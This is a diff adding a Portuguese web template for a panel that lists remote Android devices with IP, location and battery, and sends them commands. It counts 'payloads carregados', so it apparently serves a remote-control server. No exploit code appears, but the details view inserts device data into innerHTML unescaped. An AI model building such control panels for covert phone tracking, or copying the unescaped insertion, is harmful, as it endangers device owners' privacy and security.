@@ -1,0 +1,420 @@
+{% extends "base.html" %}
+
+{% block title %}Dispositivos - Sistema de Gerenciamento{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between align-items-center mb-4">
+    <h2><i class="fas fa-mobile-alt"></i> Gerenciar Dispositivos</h2>
+    <div>
+        <button class="btn btn-primary" onclick="refreshDevices()">
+            <i class="fas fa-sync-alt"></i> Atualizar
+        </button>
+        <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#deviceFilterModal">
+            <i class="fas fa-filter"></i> Filtrar
+        </button>
+    </div>
+</div>
+
+<!-- Filtros Rápidos -->
+<div class="row mb-3">
+    <div class="col-auto">
+        <div class="btn-group" role="group">
+            <button type="button" class="btn btn-outline-primary active" onclick="filterDevices('all')">
+                Todos <span class="badge bg-primary">{{ devices|length }}</span>
+            </button>
+            <button type="button" class="btn btn-outline-success" onclick="filterDevices('online')">
+                Online <span class="badge bg-success">{{ online_count }}</span>
+            </button>
+            <button type="button" class="btn btn-outline-secondary" onclick="filterDevices('offline')">
+                Offline <span class="badge bg-secondary">{{ offline_count }}</span>
+            </button>
+            <button type="button" class="btn btn-outline-warning" onclick="filterDevices('recent')">
+                Recentes <span class="badge bg-warning">{{ recent_count }}</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Tabela de Dispositivos -->
+<div class="card">
+    <div class="card-body p-0">
+        <div class="table-responsive">
+            <table class="table table-hover mb-0" id="devicesTable">
+                <thead>
+                    <tr>
+                        <th>
+                            <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
+                        </th>
+                        <th>ID</th>
+                        <th>Modelo</th>
+                        <th>Android</th>
+                        <th>Status</th>
+                        <th>Última Atividade</th>
+                        <th>IP</th>
+                        <th>Localização</th>
+                        <th>Ações</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for device in devices %}
+                    <tr class="device-row" data-status="{% if device.last_seen and (now - device.last_seen).total_seconds() < 300 %}online{% else %}offline{% endif %}" 
+                        data-recent="{% if device.last_seen and (now - device.last_seen).total_seconds() < 3600 %}recent{% endif %}">
+                        <td>
+                            <input type="checkbox" class="device-checkbox" value="{{ device.device_id }}">
+                        </td>
+                        <td>
+                            <div class="d-flex align-items-center">
+                                <i class="fas fa-mobile-alt text-muted me-2"></i>
+                                <div>
+                                    <div><strong>{{ device.device_id[:8] }}...</strong></div>
+                                    <small class="text-muted">{{ device.device_id }}</small>
+                                </div>
+                            </div>
+                        </td>
+                        <td>
+                            <div>{{ device.model }}</div>
+                            <small class="text-muted">{{ device.manufacturer }}</small>
+                        </td>
+                        <td>
+                            <span class="badge bg-info">{{ device.android_version }}</span>
+                            <div><small>API {{ device.api_level }}</small></div>
+                        </td>
+                        <td>
+                            {% if device.last_seen and (now - device.last_seen).total_seconds() < 300 %}
+                                <span class="badge bg-success">
+                                    <i class="fas fa-wifi"></i> Online
+                                </span>
+                            {% else %}
+                                <span class="badge bg-secondary">
+                                    <i class="fas fa-power-off"></i> Offline
+                                </span>
+                            {% endif %}
+                            <div>
+                                <small class="text-muted">
+                                    {% if device.battery_level %}
+                                        🔋 {{ device.battery_level }}%
+                                    {% endif %}
+                                </small>
+                            </div>
+                        </td>
+                        <td>
+                            <div>
+                                {% if device.last_seen %}
+                                    {{ device.last_seen.strftime('%d/%m %H:%M') }}
+                                {% else %}
+                                    <span class="text-muted">Nunca</span>
+                                {% endif %}
+                            </div>
+                            <div>
+                                <small class="text-muted">
+                                    {% if device.first_seen %}
+                                        Desde {{ device.first_seen.strftime('%d/%m/%Y') }}
+                                    {% endif %}
+                                </small>
+                            </div>
+                        </td>
+                        <td>
+                            {% if device.ip_address %}
+                                <code>{{ device.ip_address }}</code>
+                            {% else %}
+                                <span class="text-muted">N/A</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            {% if device.location %}
+                                <i class="fas fa-map-marker-alt text-danger"></i>
+                                {{ device.location }}
+                            {% else %}
+                                <span class="text-muted">Desconhecida</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            <div class="btn-group btn-group-sm">
+                                <button class="btn btn-outline-primary" 
+                                        onclick="showDeviceDetails('{{ device.device_id }}')"
+                                        title="Detalhes">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                                <button class="btn btn-outline-success" 
+                                        onclick="sendCommandToDevice('{{ device.device_id }}')"
+                                        title="Comando">
+                                    <i class="fas fa-terminal"></i>
+                                </button>
+                                <button class="btn btn-outline-warning" 
+                                        onclick="showDeviceLogs('{{ device.device_id }}')"
+                                        title="Logs">
+                                    <i class="fas fa-list"></i>
+                                </button>
+                                <button class="btn btn-outline-danger" 
+                                        onclick="deleteDevice('{{ device.device_id }}')"
+                                        title="Remover">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                    {% else %}
+                    <tr>
+                        <td colspan="9" class="text-center text-muted py-4">
+                            <i class="fas fa-mobile-alt fa-3x mb-3"></i>
+                            <h5>Nenhum dispositivo encontrado</h5>
+                            <p>Os dispositivos aparecerão aqui quando se conectarem ao servidor.</p>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- Ações em Lote -->
+<div class="mt-3" id="batchActions" style="display: none;">
+    <div class="card">
+        <div class="card-body">
+            <h6>Ações em Lote</h6>
+            <div class="btn-group">
+                <button class="btn btn-outline-primary btn-sm" onclick="batchCommand()">
+                    <i class="fas fa-terminal"></i> Enviar Comando
+                </button>
+                <button class="btn btn-outline-success btn-sm" onclick="batchUpdate()">
+                    <i class="fas fa-sync-alt"></i> Atualizar Status
+                </button>
+                <button class="btn btn-outline-danger btn-sm" onclick="batchDelete()">
+                    <i class="fas fa-trash"></i> Remover Selecionados
+                </button>
+            </div>
+            <span class="ms-3 text-muted" id="selectedCount">0 dispositivos selecionados</span>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Detalhes do Dispositivo -->
+<div class="modal fade" id="deviceDetailsModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Detalhes do Dispositivo</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="deviceDetailsContent">
+                <!-- Conteúdo carregado via AJAX -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Filtros -->
+<div class="modal fade" id="deviceFilterModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Filtrar Dispositivos</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="filterForm">
+                    <div class="mb-3">
+                        <label class="form-label">Status</label>
+                        <select class="form-select" name="status">
+                            <option value="">Todos</option>
+                            <option value="online">Online</option>
+                            <option value="offline">Offline</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Versão Android</label>
+                        <select class="form-select" name="android_version">
+                            <option value="">Todas</option>
+                            <option value="14">Android 14</option>
+                            <option value="13">Android 13</option>
+                            <option value="12">Android 12</option>
+                            <option value="11">Android 11</option>
+                            <option value="10">Android 10</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Modelo</label>
+                        <input type="text" class="form-control" name="model" placeholder="Ex: Galaxy S21">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Período</label>
+                        <select class="form-select" name="period">
+                            <option value="">Todos</option>
+                            <option value="1h">Última hora</option>
+                            <option value="24h">Últimas 24h</option>
+                            <option value="7d">Últimos 7 dias</option>
+                        </select>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
+                <button type="button" class="btn btn-primary" onclick="applyFilters()">Aplicar Filtros</button>
+                <button type="button" class="btn btn-outline-secondary" onclick="clearFilters()">Limpar</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    let selectedDevices = new Set();
+    
+    function toggleSelectAll() {
+        const selectAll = document.getElementById('selectAll');
+        const checkboxes = document.querySelectorAll('.device-checkbox');
+        
+        checkboxes.forEach(checkbox => {
+            checkbox.checked = selectAll.checked;
+            if (selectAll.checked) {
+                selectedDevices.add(checkbox.value);
+            } else {
+                selectedDevices.delete(checkbox.value);
+            }
+        });
+        
+        updateBatchActions();
+    }
+    
+    function updateDeviceSelection(checkbox) {
+        if (checkbox.checked) {
+            selectedDevices.add(checkbox.value);
+        } else {
+            selectedDevices.delete(checkbox.value);
+        }
+        document.getElementById('selectAll').checked = selectedDevices.size === document.querySelectorAll('.device-checkbox').length;
+        updateBatchActions();
+    }
+    
+    function updateBatchActions() {
+        const batchActions = document.getElementById('batchActions');
+        const selectedCount = document.getElementById('selectedCount');
+        
+        if (selectedDevices.size > 0) {
+            batchActions.style.display = 'block';
+            selectedCount.textContent = selectedDevices.size + ' dispositivo(s) selecionado(s)';
+        } else {
+            batchActions.style.display = 'none';
+        }
+    }
+    
+    function filterDevices(filter) {
+        const rows = document.querySelectorAll('.device-row');
+        rows.forEach(row => {
+            switch(filter) {
+                case 'all':
+                    row.style.display = '';
+                    break;
+                case 'online':
+                    row.style.display = row.dataset.status === 'online' ? '' : 'none';
+                    break;
+                case 'offline':
+                    row.style.display = row.dataset.status === 'offline' ? '' : 'none';
+                    break;
+                case 'recent':
+                    row.style.display = row.dataset.recent === 'recent' ? '' : 'none';
+                    break;
+            }
+        });
+        
+        // Atualizar botões ativos
+        document.querySelectorAll('.btn-group .btn').forEach(btn => {
+            btn.classList.remove('active');
+        });
+        event.target.classList.add('active');
+    }
+    
+    function showDeviceDetails(deviceId) {
+        fetch(`/api/device/${deviceId}`)
+            .then(response => response.json())
+            .then(device => {
+                const content = `
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>Informações Básicas</h6>
+                            <table class="table table-sm">
+                                <tr><td>ID:</td><td><code>${device.device_id}</code></td></tr>
+                                <tr><td>Modelo:</td><td>${device.model}</td></tr>
+                                <tr><td>Fabricante:</td><td>${device.manufacturer}</td></tr>
+                                <tr><td>Android:</td><td>${device.android_version} (API ${device.api_level})</td></tr>
+                            </table>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>Status</h6>
+                            <table class="table table-sm">
+                                <tr><td>Última Atividade:</td><td>${device.last_seen || 'Nunca'}</td></tr>
+                                <tr><td>Primeira Conexão:</td><td>${device.first_seen || 'N/A'}</td></tr>
+                                <tr><td>IP:</td><td>${device.ip_address || 'N/A'}</td></tr>
+                                <tr><td>Bateria:</td><td>${device.battery_level ? device.battery_level + '%' : 'N/A'}</td></tr>
+                            </table>
+                        </div>
+                    </div>
+                    <div class="mt-3">
+                        <h6>Estatísticas</h6>
+                        <p>Comandos executados: ${device.commands_count || 0}</p>
+                        <p>Payloads carregados: ${device.payloads_count || 0}</p>
+                    </div>
+                `;
+                document.getElementById('deviceDetailsContent').innerHTML = content;
+                $('#deviceDetailsModal').modal('show');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('Erro ao carregar detalhes', 'danger');
+            });
+    }
+    
+    function sendCommandToDevice(deviceId) {
+        // Redirecionar para página de comandos com dispositivo pré-selecionado
+        window.location.href = `/commands?device=${deviceId}`;
+    }
+    
+    function showDeviceLogs(deviceId) {
+        // Redirecionar para página de logs com filtro por dispositivo
+        window.location.href = `/logs?device=${deviceId}`;
+    }
+    
+    function deleteDevice(deviceId) {
+        if (confirm('Tem certeza que deseja remover este dispositivo?')) {
+            fetch(`/api/device/${deviceId}`, { method: 'DELETE' })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showNotification('Dispositivo removido com sucesso', 'success');
+                        location.reload();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showNotification('Erro ao remover dispositivo', 'danger');
+                });
+        }
+    }
+    
+    function refreshDevices() {
+        location.reload();
+    }
+    
+    function applyFilters() {
+        const formData = new FormData(document.getElementById('filterForm'));
+        // Implementar lógica de filtro
+        $('#deviceFilterModal').modal('hide');
+    }
+    
+    function clearFilters() {
+        document.getElementById('filterForm').reset();
+        filterDevices('all');
+    }
+    
+    // Atualizar seleção quando checkbox é clicado
+    document.addEventListener('DOMContentLoaded', function() {
+        document.querySelectorAll('.device-checkbox').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                updateDeviceSelection(this);
+            });
+        });
+    });
+</script>
+{% endblock %}
